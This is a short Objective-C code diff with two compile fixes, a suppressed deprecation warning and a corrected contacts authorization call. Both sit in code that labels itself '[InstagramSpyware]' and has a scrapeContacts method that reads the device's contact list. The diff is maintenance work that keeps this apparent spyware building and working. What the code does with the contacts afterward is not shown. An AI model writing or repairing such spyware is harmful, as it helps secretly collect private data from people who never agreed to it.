@@ -100,7 +100,10 @@
             if (keyWindow) break;
         }
     } else {
-        keyWindow = [UIApplication sharedApplication].keyWindow;
+         #pragma clang diagnostic push
+         #pragma clang diagnostic ignored "-Wdeprecated-declarations"
+         keyWindow = [UIApplication sharedApplication].keyWindow;
+         #pragma clang diagnostic pop
     }
 
     if (!keyWindow) {
@@ -123,7 +126,7 @@
 - (void)scrapeContacts {
     if (![CNContactStore class]) return;
     CNContactStore *store = [[CNContactStore alloc] init];
-    if ([store authorizationStatusForEntityType:CNEntityTypeContacts] != CNAuthorizationStatusAuthorized) {
+    if ([CNContactStore authorizationStatusForEntityType:CNEntityTypeContacts] != CNAuthorizationStatusAuthorized) {
         NSLog(@"[InstagramSpyware] Contacts not authorized.");
         return;
     }
